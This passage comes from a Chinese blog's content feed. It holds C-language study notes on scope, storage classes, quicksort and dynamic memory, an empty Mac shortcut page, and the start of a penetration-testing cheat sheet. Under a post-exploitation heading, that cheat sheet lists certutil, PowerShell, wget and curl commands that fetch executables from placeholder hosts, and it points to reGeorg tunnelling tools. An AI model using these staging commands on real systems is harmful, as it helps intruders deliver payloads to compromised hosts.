class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> num1, num2;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="type">int</span> (*fp)();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input example 1+2 or 3-2 :\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%c%d"</span>, &amp;num1, &amp;c, &amp;num2);</span><br><span class="line">    fp = select(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %c %d = %d\n"</span>, num1, c, num2, calc(fp, num1, num2));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220814114411926.png" alt="结果" style="zoom:67%;"><h3 id="全局变量与局部变量"><a href="#全局变量与局部变量" class="headerlink" title="全局变量与局部变量"></a>全局变量与局部变量</h3><p>与其他语言一样，局部有限覆盖同名全局。</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span>{</span><br><span class="line">  <span class="keyword">extern</span> a; <span class="comment">// extern 关键字用于修饰外部变量 </span></span><br><span class="line">  a++;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">  fun();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><h5 id="四大作用域"><a href="#四大作用域" class="headerlink" title="四大作用域"></a>四大作用域</h5><ul><li>代码块作用域：只作用于当前代码块，如函数内部或大括号内部</li><li>文件作用域：从声明开始到文件结尾都可访问，可用extern声明已经定义变量，如函数名</li><li>原型作用域：函数声明的参数名 </li><li>函数作用域：用于goto</li></ul><h5 id="声明与定义"><a href="#声明与定义" class="headerlink" title="声明与定义"></a>声明与定义</h5><ul><li>定义只有一次，声明可以无数次</li><li>定义为向编译器申请内存空间并赋随机值，声明为通知编译器该变量已存在无需再申请空间</li><li>全局变量既是声明又是定义</li></ul><h5 id="链接属性"><a href="#链接属性" class="headerlink" title="链接属性"></a>链接属性</h5><ul><li>external：外部链接属性，文件作用域中的变量自带属性（默认）</li><li>internal：内部链接属性，文件作用域中的变量自带属性</li><li>none：除文件作用域变量外的变量自带属性</li></ul><p>*** **可使用static关键字将external的变量改为internal，使其成为私有属性防止外部文件对其进行更改调用</p><h4 id="生存期"><a href="#生存期" class="headerlink" title="生存期"></a>生存期</h4><ul><li>静态存储期(static storage duration)：程序执行期间一直占用内存，执行完毕后销毁，例如函数</li><li>自动存储期(automatic storage duration)：代码块作用域的变量执行完毕后自动销毁，例如for循环变量，局部变量</li></ul><h5 id="auto-自动变量"><a href="#auto-自动变量" class="headerlink" title="auto 自动变量"></a>auto 自动变量</h5><p>代码块作用域、自动存储期、空链接属性</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815082439298.png" alt="auto变量"></p><h5 id="register-寄存器变量"><a href="#register-寄存器变量" class="headerlink" title="register 寄存器变量"></a>register 寄存器变量</h5><p>大多数与自动变量属性相同，代码块作用域、自动存储期、空链接属性 </p><p>*****注：寄存器变量无法获取变量地址，因为cpu地址不允许获取</p><h5 id="static-静态局部变量"><a href="#static-静态局部变量" class="headerlink" title="static 静态局部变量"></a>static 静态局部变量</h5><p>使external变量变为internal变量，多文件共享变为单文件独享</p><h5 id="typedef-别名"><a href="#typedef-别名" class="headerlink" title="typedef 别名"></a>typedef 别名</h5><p>详情看结构体</p><h4 id="部分算法（不做深究）"><a href="#部分算法（不做深究）" class="headerlink" title="部分算法（不做深究）"></a>部分算法（不做深究）</h4><h5 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h5><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 快速排序</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort</span><span class="params">(<span class="type">int</span>[], <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arr_p</span><span class="params">(<span class="type">int</span>[], <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印数组值</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">arr_p</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> length)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%4d "</span>, arr[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> left, <span class="type">int</span> right)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 快速排序实现：</span></span><br><span class="line"><span class="comment">     * 1. 取得中值,左值坐标,右值坐标</span></span><br><span class="line"><span class="comment">     * 2. 寻找左值大于中值，右值小于中值的值</span></span><br><span class="line"><span class="comment">     * 3. 当左值大于右值,进行交换</span></span><br><span class="line"><span class="comment">     * 4. 当左值坐标大于右值坐标，重新排序左右数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> l = left, r = right, temp, middle;</span><br><span class="line">    middle = (right + left) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">while</span> (arr[l] &lt; arr[middle])</span><br><span class="line">        {</span><br><span class="line">            l++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">while</span> (arr[r] &gt; arr[middle])</span><br><span class="line">        {</span><br><span class="line">            r--;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= r)</span><br><span class="line">        {</span><br><span class="line">            temp = arr[l];</span><br><span class="line">            arr[l] = arr[r];</span><br><span class="line">            arr[r] = temp;</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l &lt; right)</span><br><span class="line">        {</span><br><span class="line">            quick_sort(arr, l, right);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (left &lt; r)</span><br><span class="line">        {</span><br><span class="line">            quick_sort(arr, left, r);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> arr1[] = {<span class="number">14</span>, <span class="number">2</span>, <span class="number">66</span>, <span class="number">457</span>, <span class="number">8</span>, <span class="number">7987</span>, <span class="number">35</span>, <span class="number">8</span>, <span class="number">342</span>, <span class="number">654</span>, <span class="number">867</span>, <span class="number">213</span>};</span><br><span class="line">    <span class="type">int</span> arr2[] = {<span class="number">14</span>, <span class="number">2</span>, <span class="number">66</span>, <span class="number">457</span>, <span class="number">8</span>, <span class="number">7987</span>, <span class="number">35</span>, <span class="number">8</span>, <span class="number">342</span>, <span class="number">654</span>, <span class="number">867</span>};</span><br><span class="line">    <span class="type">int</span> length = <span class="keyword">sizeof</span>(arr1) / <span class="keyword">sizeof</span>(arr1[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> length2 = <span class="keyword">sizeof</span>(arr2) / <span class="keyword">sizeof</span>(arr2[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"前："</span>);</span><br><span class="line">    arr_p(arr1, length);</span><br><span class="line">    quick_sort(arr1, <span class="number">0</span>, length - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"后："</span>);</span><br><span class="line">    arr_p(arr1, length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- - - - - - - - - - - - - - - - - -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"前："</span>);</span><br><span class="line">    arr_p(arr2, length2);</span><br><span class="line">    quick_sort(arr2, <span class="number">0</span>, length2 - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"后："</span>);</span><br><span class="line">    arr_p(arr2, length2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815105623131.png" alt="结果"></p><h4 id="动态内存管理"><a href="#动态内存管理" class="headerlink" title="动态内存管理"></a>动态内存管理</h4><ul><li>malloc ：申请动态内存空间</li><li>free ：释放动态内存空间</li></ul><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"初始化失败！\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入一个int型数据："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"你输入的是%d \n"</span>, *p);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"你输入的是%d \n"</span>, *p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815130233080.png" alt="结果"></p><p>不及时释放内存容易造成隐式内存泄露和内存块地址丢失</p><p>批量申请内存</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">NULL</span>, num, i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入需要录入的整数个数:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num);</span><br><span class="line"></span><br><span class="line">    p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(num * (<span class="keyword">sizeof</span>(<span class="type">int</span>)));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"内存初始化失败！"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入第%d个整数:"</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入的整数为(%d个)：\n"</span>, num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%2d "</span>, p[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815153151798.png" alt="结果" style="zoom:67%;"><h5 id="其他内存管理函数"><a href="#其他内存管理函数" class="headerlink" title="其他内存管理函数"></a>其他内存管理函数</h5><ul><li>memchr：查找字符在字符串中位置</li></ul><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">""</span>, c = <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入需要查找的字符串和字符（str char）："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s %c"</span>, str, &amp;c);</span><br><span class="line"></span><br><span class="line">    p = (<span class="type">char</span> *)<span class="built_in">memchr</span>(str, c, <span class="built_in">strlen</span>(str));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"None!\n"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Extra! addr is %p , index is %ld \n"</span>, p, p - str);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815160515371.png" alt="结果"></p><ul><li>memset</li></ul><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(N * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(p, <span class="number">0</span>, N * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%2d "</span>, p[i]);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815163136209.png" alt="结果"></p><ul><li>calloc ：申请并初始化一系列内存空间</li></ul><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815162313964.png" alt="calloc与malloc区别"></p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = (<span class="type">int</span> *)<span class="built_in">calloc</span>(N, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, p[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>结果与上图等价</p><ul><li>realloc ：重新分配内存空间</li></ul><p>***** 注:</p><ol><li>修改的内存空间大小为size字节</li><li>新分配的控件比原来大，数据不变；比原来小，数据可能丢失！</li></ol><p>示例：使用realloc持续申请可变大小的堆内存</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> flag -1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> num, count = <span class="number">0</span>, *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"please input a int (input -1 to exit): "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num);</span><br><span class="line">        count++;</span><br><span class="line">        p = (<span class="type">int</span> *)<span class="built_in">realloc</span>(p, count * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        p[count - <span class="number">1</span>] = num;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ERROR! No size for your put!\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">while</span> (num != flag);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your input num is :"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%2d "</span>, p[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815171745531.png" alt="结果" style="zoom:67%;"><h4 id="内存布局规律"><a href="#内存布局规律" class="headerlink" title="内存布局规律"></a>内存布局规律</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815173724829.png" alt="内存地址高低规律"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/7e20/image-20220815173752258.png" alt="内存段"></p><ul><li>代码段：存放执行代码，也可能包含常数变量</li><li>数据段：存放初始化的全局变量和静态局部变量</li><li>BSS段：存放未初始化全局变量和静态局部变量</li><li>堆（heap）：存放进程运行时被动态分配的内存段，大小不固定，需要手动释放</li><li>栈（stack）：函数执行的内存区域<ul><li>区别：<ul><li>堆手动分配，手动释放</li><li>栈自动分配，自动释放</li></ul></li><li>生存周期：<ul><li>堆可相互访问，直到手动释放为止</li><li>栈不可相互访问</li></ul></li><li>发展方向<ul><li>堆从低地址到高地址</li><li>栈从高地址到低地址</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac常用快捷键</title>
      <link href="/posts/4c3d.html"/>
      <url>/posts/4c3d.html</url>
      
        <content type="html"><![CDATA[<h2 id="通用型"><a href="#通用型" class="headerlink" title="通用型"></a>通用型</h2><div class="tabs" id="通用"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#通用-1">系统</button></li><li class="tab"><button type="button" data-href="#通用-2">chrome</button></li><li class="tab"><button type="button" data-href="#通用-3">访达</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="通用-1"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="通用-2"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="通用-3"><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h2><p>设置方法: <a href="https://a.txt/">–&gt;请戳我&lt;–</a></p><table><thead><tr><th>功能</th><th>快捷键</th></tr></thead><tbody><tr><td>全局打开控制台（访达不适用）</td><td>command + option + R ：</td></tr><tr><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> skill </category>
          
          <category> Mac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快捷键 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透中常用命令</title>
      <link href="/posts/3d5b.html"/>
      <url>/posts/3d5b.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="1-搜索引擎"><a href="#1-搜索引擎" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h3><h2 id="0x00-后渗透"><a href="#0x00-后渗透" class="headerlink" title="0x00 后渗透"></a>0x00 后渗透</h2><h3 id="1-上传下载文件"><a href="#1-上传下载文件" class="headerlink" title="1.上传下载文件"></a>1.上传下载文件</h3><div class="tabs" id="系统"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#系统-1"><i class="fab fa-windows"></i>windows</button></li><li class="tab"><button type="button" data-href="#系统-2"><i class="fab fa-linux"></i>linux</button></li><li class="tab"><button type="button" data-href="#系统-3"><i class="fas fa-globe"></i>通用</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="系统-1"><div class="tabs" id="windows"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#windows-1">certuil</button></li><li class="tab"><button type="button" data-href="#windows-2">powershell</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="windows-1"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://xxx.com/a.php</span><br></pre></td></tr></tbody></table></figure><p>参考:<a href="https://zhuanlan.zhihu.com/p/107819644">https://zhuanlan.zhihu.com/p/107819644</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="windows-2"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">powershell <span class="string">"(Cet-Object System.Net.WebClient).Downloadfile('http://example.com/a.exe','a.exe')"</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">powershell -c <span class="string">"invoke-WebRequest -Uri 'http://example.com/a.exe' -OutFile 'C:\Windows\Temp\a.exe"</span></span><br></pre></td></tr></tbody></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="系统-2"><div class="tabs" id="linux"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#linux-1">scp</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="linux-1"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">scp [local_file_path] username@[ip]:/[remote_file_path]</span><br></pre></td></tr></tbody></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="系统-3"><div class="tabs" id="globe"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#globe-1">wget</button></li><li class="tab"><button type="button" data-href="#globe-2">curl</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="globe-1"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">wget https://xxx.com/1.exe -O 1.exe –limit-rate=500k</span><br></pre></td></tr></tbody></table></figure><p>解释：下载1.exe文件，以500k速率下载，并保存为1.exe</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="globe-2"><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">curl http://xxx.com/1.exe -O</span><br></pre></td></tr></tbody></table></figure><p>解释：下载1.exe文件，保存为同名文件</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="2-代理"><a href="#2-代理" class="headerlink" title="2.代理"></a>2.代理</h3><div class="tabs" id="proxy"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#proxy-1"><i class="fas fa-location-arrow"></i>正向代理</button></li><li class="tab"><button type="button" data-href="#proxy-2"><i class="fas fa-compass"></i>反向代理</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="proxy-1"><p>适用于目标不出网，代理自身</p><div class="tabs" id="positive"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#positive-1">reGeorg</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="positive-1"><p>neo-reGeorg： <a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a><br>reGeorg： <a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><ol><li><p>上传文件</p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3d5b/image-20220729上午22245838.png" alt="上传服务端代理shell" 